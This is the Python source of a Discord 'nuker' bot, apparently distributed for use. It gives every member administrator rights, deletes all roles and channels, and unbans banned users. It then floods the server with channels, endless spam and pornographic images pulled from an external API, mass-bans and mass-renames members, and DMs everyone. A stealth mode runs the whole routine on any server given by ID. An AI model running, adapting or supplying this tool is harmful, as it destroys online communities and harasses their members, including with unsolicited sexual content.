import discord, asyncio, json, time, sys, aiohttp, requests, random, os
from discord.ext import commands
from discord import Permissions
from colorama import Fore, Style
from pystyle import Colors, Colorate, Center, Write, Box
from threading import Thread


with open('config.json') as config_file:
    data = json.load(config_file)

Token = data['Token']
ChannelName = data['ChannelName']
SpamMessage = data['SpamMessage']
ChannelAmount = data['ChannelAmount']
MessageAllSpeed = data['MessageAllSpeed']
ActivityStatus = data['ActivityStatus']
NsfwSpam = data['NsfwSpam']
RoleSpamAmount = data['RoleSpamAmount']
RoleSpamName = data['RoleSpamName']

SPAM_MESSAGE = [SpamMessage]

intents = discord.Intents(messages=True, guilds=True, members=True)

client = commands.Bot(command_prefix='.', intents=intents)

clear = lambda: os.system('cls')

def menu():
    print(Center.XCenter("iliyaa.tk"))
    print(Center.XCenter(Box.DoubleCube('''[1] Continue To Regular Mode
    [2] Stealth Nuke''')))

menu()
option = int(input(Center.XCenter("Option: ")))

while option != 0:
    if option == 1:
        clear()
        @client.event
        async def on_ready():
            print(Colorate.Vertical(Colors.yellow_to_red, f'''
██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗  ░█████╗░███████╗██████╗░██╗███████╗░██████╗
██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝  ██╔══██╗██╔════╝██╔══██╗██║██╔════╝██╔════╝
██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░  ███████║█████╗░░██████╔╝██║█████╗░░╚█████╗░
██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░  ██╔══██║██╔══╝░░██╔══██╗██║██╔══╝░░░╚═══██╗
██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░  ██║░░██║███████╗██║░░██║██║███████╗██████╔╝
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝╚══════╝╚═════╝░

Logged in as {client.user}

Creator's Website -- iliyaa.tk

.commands

> Regular Mode <
            ''', 1))
            await client.change_presence(activity=discord.Game(name=ActivityStatus))

        @client.command()
        async def nuke(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.GREEN + "Everyone has recieved administrator." + Fore.RESET)
            except:
                print(Fore.MAGENTA + "Unable to give @everyone administrator." + Fore.RESET)
            for role in guild.roles:
                try:
                    await role.delete()
                    print(Fore.GREEN + f"{role.name} has been deleted." + Fore.RESET)
                except:
                    print(Fore.MAGENTA + f"{role.name} could not be deleted." + Fore.RESET)
            for channel in guild.channels:
              try:
                await channel.delete()
                print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
              except:
               print(Fore.MAGENTA + f"{channel.name} was NOT deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:
                await user.unban("iliyaa-tk")
                print(Fore.GREEN + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
              except:
                print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
            await guild.create_text_channel("iliyaa-tk")
            for channel in guild.text_channels:
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite: {link}")
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(ChannelName))
            print(f"Nuked {guild.name} Successfully.")
            return

        @client.command()
        async def stealthnuke(ctx):
            await ctx.reply('Check Your Console!')
            ID = Write.Input("Enter GuildID -> ", Colors.yellow_to_red, interval=0.06)
            guild = client.get_guild(int(ID))
            try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.GREEN + "Everyone has recieved administrator." + Fore.RESET)
            except:
                print(Fore.MAGENTA + "Unable to give @everyone administrator." + Fore.RESET)
            for role in guild.roles:
                try:
                    await role.delete()
                    print(Fore.GREEN + f"{role.name} has been deleted." + Fore.RESET)
                except:
                    print(Fore.MAGENTA + f"{role.name} could not be deleted." + Fore.RESET)
            for channel in guild.channels:
              try:
                await channel.delete()
                print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
              except:
                print(Fore.MAGENTA + f"{channel.name} was NOT deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:
                await user.unban("iliyaa-tk")
                print(Fore.GREEN + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
              except:
                print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
            await guild.create_text_channel("iliyaa-tk")
            for channel in guild.text_channels:
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite: {link}")
            # old code for amount of channels obviously    amount = 500
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(ChannelName))
            print(f"Nuked {guild.name} Successfully.")
            return

        @client.command(pass_context=True)
        async def banall(ctx):
            guild = ctx.guild
            await ctx.message.delete()
            for member in guild.members:
                try:
                    await member.ban()
                    print(Fore.GREEN + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
                except:
                    print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)

        @client.command(pass_context=True)
        async def webhook(ctx):
            channel = ctx.message.channel
            await ctx.message.delete()
            try:
                webhook = await channel.create_webhook(name="Bob")
                print(Fore.GREEN + f"Webhook Created {webhook.url} " + Fore.RESET)
            except:
                print(Fore.MAGENTA + f"Couldn't Create Webhook" + Fore.RESET)

        @client.command(pass_context=True)
        async def renameall(ctx, *, rename_to):
            guild = ctx.guild
            await ctx.message.delete()
        #    for member in list(client.get_all_members()):
            for member in guild.members:
                try:
                    await member.edit(nick=rename_to)
                    print (Fore.GREEN + f"{member.name} has been renamed to {rename_to}" + Fore.RESET)
                except:
                    print (Fore.MAGENTA + f"{member.name} has NOT been renamed" + Fore.RESET)

        @client.command(pass_context=True)
        async def messageall(ctx, *, messagename):
            await ctx.message.delete()
            for member in list(client.get_all_members()):
                await asyncio.sleep(0)
                try:
                    await asyncio.sleep(int(MessageAllSpeed))
                    await member.send(messagename)
                except:
                    pass
                print(Fore.GREEN + f"DMed {member} *{messagename}*" + Fore.RESET)

        @client.command(pass_context=True)
        async def adminall(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.GREEN + "Everyone has recieved administrator." + Fore.RESET)
            except:
                print(Fore.MAGENTA + "Unable to give @everyone administrator." + Fore.RESET)

        @client.command(pass_context=True)
        async def nsfwspam(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            for i in range(int(NsfwSpam)):
                for channel in guild.channels:
                    try:
                        async with aiohttp.ClientSession() as cs:
                            async with cs.get(f'https://nekobot.xyz/api/image?type=hentai') as r:

                                data = await r.json()
                                embed = discord.Embed(title="www.iliyaa.tk", color=0)
                                embed.set_image(url=data['message'])

                                await channel.send(embed=embed)
                    except:
                        print(Fore.MAGENTA + f"Unable to send nsfw in {channel.name}" + Fore.RESET)

        @client.command()
        async def stop(ctx):
            await ctx.message.delete()
            await asyncio.sleep(0.5)
            await ctx.bot.logout()
            print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

        @client.command()
        async def rolespam(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            for i in range(int(RoleSpamAmount)):
                await guild.create_role(name=RoleSpamName)
                print(Fore.GREEN + f'Successfully created role: {RoleSpamName}' + Fore.RESET)

        @client.command()
        async def commands(ctx):
            await ctx.message.delete()
            try:
                await ctx.author.send('''**COMMANDS**
.nuke
.banall
.webhook
.renameall <input>
.messageall <input>
.adminall
.nfswspam
.stop
.commands
.stealthnuke''')
                print(Fore.GREEN + "You have been dmed the commands." + Fore.RESET)
            except:
                print(Fore.GREEN + "Unable to DM commands." + Fore.RESET)

        @client.event
        async def on_guild_channel_create(channel):
          while True:
            await channel.send(random.choice(SPAM_MESSAGE))

        client.run(Token, bot=True)
    elif option == 2:
        clear()
        @client.event
        async def on_ready():
            print(Colorate.Vertical(Colors.black_to_red, f'''
██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗  ░█████╗░███████╗██████╗░██╗███████╗░██████╗
██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝  ██╔══██╗██╔════╝██╔══██╗██║██╔════╝██╔════╝
██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░  ███████║█████╗░░██████╔╝██║█████╗░░╚█████╗░
██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░  ██╔══██║██╔══╝░░██╔══██╗██║██╔══╝░░░╚═══██╗
██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░  ██║░░██║███████╗██║░░██║██║███████╗██████╔╝
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░  ╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝╚══════╝╚═════╝░

Logged in as {client.user}

Creator's Website -- iliyaa.tk

> STEALTH MODE <

            ''', 1))
            await client.change_presence(activity=discord.Game(name=ActivityStatus))
            ID = Write.Input("Enter GuildID -> ", Colors.red, interval=0.06)
            guild = client.get_guild(int(ID))
            try:
                role = discord.utils.get(guild.roles, name = "@everyone")
                await role.edit(permissions = Permissions.all())
                print(Fore.GREEN + "Everyone has recieved administrator." + Fore.RESET)
            except:
                print(Fore.MAGENTA + "Unable to give @everyone administrator." + Fore.RESET)
            for role in guild.roles:
                try:
                    await role.delete()
                    print(Fore.GREEN + f"{role.name} has been deleted." + Fore.RESET)
                except:
                    print(Fore.MAGENTA + f"{role.name} could not be deleted." + Fore.RESET)
            for channel in guild.channels:
              try:
                await channel.delete()
                print(Fore.GREEN + f"{channel.name} was deleted." + Fore.RESET)
              except:
                print(Fore.MAGENTA + f"{channel.name} was NOT deleted." + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
              user = ban_entry.user
              try:
                await user.unban("iliyaa-tk")
                print(Fore.GREEN + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
              except:
                print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
            await guild.create_text_channel("iliyaa-tk")
            for channel in guild.text_channels:
                link = await channel.create_invite(max_age = 0, max_uses = 0)
                print(f"New Invite: {link}")
            for i in range(int(ChannelAmount)):
               await guild.create_text_channel(random.choice(ChannelName))
            print(f"Nuked {guild.name} Successfully.")
            return

        @client.event
        async def on_guild_channel_create(channel):
          while True:
            await channel.send(random.choice(SPAM_MESSAGE))

        client.run(Token, bot=True)
    else:
        print("Invalid Option.")
